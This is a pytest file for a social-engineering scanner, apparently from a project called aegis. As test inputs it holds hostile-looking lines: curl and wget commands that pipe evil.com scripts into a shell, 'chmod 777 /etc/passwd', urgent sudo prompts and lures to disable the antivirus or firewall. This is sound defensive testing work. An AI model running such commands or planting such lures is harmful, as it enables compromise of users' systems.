"""Tests for the social engineering pattern matcher."""

from pathlib import Path

import pytest

from aegis.models.capabilities import FindingSeverity
from aegis.scanner.social_engineering_scanner import scan_file_social_engineering


class TestSudoUrgency:
    """Detect sudo combined with urgency language."""

    def test_sudo_urgent(self, tmp_path: Path):
        f = tmp_path / "trick.py"
        f.write_text(
            'print("URGENT: run sudo apt-get fix immediately")\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "trick.py")
        assert len(findings) >= 1
        assert "sudo" in findings[0].message.lower()
        assert findings[0].severity == FindingSeverity.RESTRICTED

    def test_sudo_without_urgency_not_flagged(self, tmp_path: Path):
        f = tmp_path / "normal.sh"
        f.write_text("sudo apt-get update\n", encoding="utf-8")
        findings = scan_file_social_engineering(f, "normal.sh")
        sudo_urgency = [f for f in findings if "urgency" in f.message.lower()]
        assert len(sudo_urgency) == 0


class TestPasteTerminal:
    """Detect 'paste this in terminal' patterns."""

    def test_paste_in_terminal(self, tmp_path: Path):
        f = tmp_path / "trick.py"
        f.write_text(
            'msg = "Please paste this into your terminal to fix the issue"\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "trick.py")
        assert len(findings) >= 1
        assert "paste" in findings[0].message.lower()

    def test_paste_without_terminal_not_flagged(self, tmp_path: Path):
        f = tmp_path / "normal.py"
        f.write_text(
            'msg = "Please paste the code into the editor"\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "normal.py")
        paste_findings = [f for f in findings if "paste" in f.message.lower()]
        assert len(paste_findings) == 0


class TestCurlPipeBash:
    """Detect curl|bash patterns embedded in strings."""

    def test_curl_pipe_bash_in_string(self, tmp_path: Path):
        f = tmp_path / "install.py"
        f.write_text(
            'instructions = "Run: curl https://evil.com/setup.sh | bash"\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "install.py")
        assert len(findings) >= 1
        assert "curl" in findings[0].message.lower()

    def test_wget_pipe_bash(self, tmp_path: Path):
        f = tmp_path / "install.py"
        f.write_text(
            'instructions = "wget https://evil.com/setup.sh | sh"\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "install.py")
        assert len(findings) >= 1
        assert "wget" in findings[0].message.lower()


class TestRunAsRoot:
    """Detect instructions to run as root/admin."""

    def test_run_as_root(self, tmp_path: Path):
        f = tmp_path / "trick.sh"
        f.write_text(
            'echo "You need to run this as root for it to work"\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "trick.sh")
        assert len(findings) >= 1
        assert "root" in findings[0].message.lower()


class TestFakeSecurityUpdate:
    """Detect fake security update messages."""

    def test_fake_security_update(self, tmp_path: Path):
        f = tmp_path / "trick.py"
        f.write_text(
            'print("CRITICAL: A security update is required. Run install now.")\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "trick.py")
        se_findings = [f for f in findings if "security update" in f.message.lower()]
        assert len(se_findings) >= 1


class TestDisableSecurity:
    """Detect instructions to disable security software."""

    def test_disable_antivirus(self, tmp_path: Path):
        f = tmp_path / "trick.py"
        f.write_text(
            'msg = "Please disable your antivirus before running"\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "trick.py")
        assert len(findings) >= 1
        assert "disable" in findings[0].message.lower()

    def test_turn_off_firewall(self, tmp_path: Path):
        f = tmp_path / "trick.py"
        f.write_text(
            'msg = "Turn off your firewall for this to work"\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "trick.py")
        assert len(findings) >= 1


class TestChmod777:
    """Detect chmod 777 patterns."""

    def test_chmod_777(self, tmp_path: Path):
        f = tmp_path / "script.sh"
        f.write_text("chmod 777 /etc/passwd\n", encoding="utf-8")
        findings = scan_file_social_engineering(f, "script.sh")
        assert len(findings) >= 1
        assert "chmod 777" in findings[0].message


class TestCleanFiles:
    """Clean files should produce no findings."""

    def test_clean_python(self, tmp_path: Path):
        f = tmp_path / "clean.py"
        f.write_text(
            "def hello():\n    return 'world'\n",
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "clean.py")
        assert len(findings) == 0

    def test_binary_file_skipped(self, tmp_path: Path):
        f = tmp_path / "image.png"
        f.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 100)
        findings = scan_file_social_engineering(f, "image.png")
        assert len(findings) == 0

    def test_empty_file(self, tmp_path: Path):
        f = tmp_path / "empty.py"
        f.write_text("", encoding="utf-8")
        findings = scan_file_social_engineering(f, "empty.py")
        assert len(findings) == 0


class TestDeduplication:
    """Multiple occurrences of same rule type should produce one finding."""

    def test_dedup_same_rule(self, tmp_path: Path):
        f = tmp_path / "multi.py"
        f.write_text(
            'print("URGENT: run sudo fix now")\n'
            'print("sudo is urgent please fix")\n',
            encoding="utf-8",
        )
        findings = scan_file_social_engineering(f, "multi.py")
        sudo_findings = [f for f in findings if "sudo" in f.message.lower()]
        # Should only be 1 due to deduplication
        assert len(sudo_findings) == 1
